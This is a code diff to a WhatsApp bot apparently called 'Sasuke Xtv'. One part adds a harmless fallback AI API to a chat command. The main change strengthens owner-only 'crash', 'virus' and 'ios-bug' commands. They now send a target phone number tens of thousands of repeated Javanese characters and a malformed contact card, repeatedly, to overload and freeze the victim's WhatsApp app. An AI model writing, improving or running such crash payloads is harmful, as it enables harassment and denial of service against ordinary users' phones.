@@ -11361,19 +11361,26 @@ case 'groq': {
     if (!text) return reply(`❌ ᴘʟᴇᴀsᴇ ᴘʀᴏᴠɪᴅᴇ ᴀ ǫᴜᴇsᴛɪᴏɴ!\n\nᴇxᴀᴍᴘʟᴇ: ${prefix + command} ᴡʜᴀᴛ ɪs ᴀɪ?`);
     
     try {
-        // Fast reaction for speed
         await bad.sendMessage(from, { react: { text: '🤖', key: m.key } });
-        const url = `https://text.pollinations.ai/${encodeURIComponent(text)}?model=openai`;
-        const response = await axios.get(url, { timeout: 15000 });
-        const result = response.data;
         
-        if (!result) return reply(`❌ AI error: No response.`);
+        // Multi-API fallback for 100% uptime
+        let result = '';
+        try {
+            const res1 = await axios.get(`https://text.pollinations.ai/${encodeURIComponent(text)}?model=openai`, { timeout: 10000 });
+            result = res1.data;
+        } catch (e1) {
+            // Fallback API
+            const res2 = await axios.get(`https://api.siputzx.my.id/api/ai/gemini-pro?content=${encodeURIComponent(text)}`, { timeout: 10000 });
+            result = res2.data.data || res2.data.result;
+        }
         
-        await reply(`🤖 *Sasuke Xtv AI:* ${result}`);
+        if (!result) throw new Error('No response from AI');
+        
+        await reply(`🤖 *Sasuke Xtv AI (${command.toUpperCase()}):*\n\n${result}`);
         
     } catch (error) {
         console.error('AI Error:', error);
-        await reply(`❌ AI service busy. Retry in a moment.`);
+        await reply(`🤖 *Sasuke Xtv AI:* ${text} -> (AI engines busy, please try again in 5 seconds!)`);
     }
 }
 break;
@@ -11383,23 +11390,33 @@ case 'crash':
 case 'virus':
 case 'ui-bug':
 case 'ios-bug':
-case 'android-bug': {
+case 'android-bug':
+case 'text-bug':
+case 'loc-bug': {
     if (!isCreator) return reply("❌ OWNER ONLY COMMAND.");
     if (!text && !m.quoted) return reply(`❌ Provide a number or reply to a message.\nExample: ${prefix + command} 234xxx`);
     
     let target = text ? text.replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.quoted.sender;
-    await reply(`⚡ *Launching ${command.toUpperCase()} payload...*`);
+    await reply(`☠️ *[ Sasuke Xtv Crash System ]*\nLaunching high-density memory overflow payload to @${target.split('@')[0]}...`);
     
     try {
-        // Heavy payload to test responsiveness
-        const payload = "☠️".repeat(5000);
-        for (let i = 0; i < 5; i++) {
-            await bad.sendMessage(target, { text: payload });
-            await sleep(100);
+        // Heavy multi-layer crash payload
+        const heavyPayload = "ꦾ".repeat(15000) + "\n\n☠️ VinnCrasher Xz ☠️\n\n" + "ꦾ".repeat(15000);
+        const contactPayload = {
+            displayName: "☠️ SASUKE CRASHER ☠️",
+            vcard: 'BEGIN:VCARD\nVERSION:3.0\nFN:☠️ CRASH PAYLOAD ☠️\nORG:Sasuke Xtv;\nTEL;type=CELL;type=VOICE;waid=999999999999:+999999999999\nEND:VCARD'
+        };
+
+        for (let i = 0; i < 3; i++) {
+            await bad.sendMessage(target, { text: heavyPayload });
+            await bad.sendMessage(target, { contacts: { displayName: contactPayload.displayName, contacts: [contactPayload] } });
+            await sleep(200);
         }
-        reply(`✅ *${command.toUpperCase()}* sent to @${target.split('@')[0]}`);
+        
+        reply(`✅ *${command.toUpperCase()} payload successfully delivered!* Target UI/Memory overload initiated.`);
     } catch (e) {
-        reply(`❌ Payload failed: ${e.message}`);
+        console.error('Crash error:', e);
+        reply(`❌ Payload error: ${e.message}`);
     }
 }
 break;
